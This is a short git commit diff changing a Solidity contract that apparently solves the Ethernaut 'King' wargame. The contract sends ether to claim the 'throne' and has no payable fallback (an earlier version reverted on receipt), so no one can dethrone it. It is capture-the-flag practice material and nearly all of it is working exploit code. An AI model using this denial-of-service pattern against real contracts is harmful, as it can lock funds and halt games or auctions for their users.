1164b13c89c4ce6bc99ee02f646c55486b51a6d7
"Mike Dougherty" <"miked@threedev.io">
2022-06-23 16:48:30 -0700

    attack King the ethernaut way

--- contracts/BecomeKing.sol
+++ contracts/BecomeKing.sol
@@ -9,18 +9,10 @@ pragma solidity ^0.6.0;
 contract BecomeKing {
 
     address payable challenge = 0xE9C0A428D857E5f3502609f2901b0b573C6816E4;
-
-    function attack() external payable {
-        require(msg.value == 1 ether, "please send exactly 1 ether");
-        // claim throne
-        // use call here instead of challenge.transfer because transfer
-        // has a gas limit and runs out of gas
-        (bool success, ) = payable(address(challenge)).call{value: msg.value}("");
-        require(success, "External call failed");
+    function doYourThing(address _target) public payable {
+        (bool result,) = _target.call{value:msg.value}("");
+        if(!result) revert();
     }
 
-    receive() external payable {
-        require(false, "cannot claim my throne!");
-    }
-
+    // OMG NO PAYABLE FALLBACK!!
 }
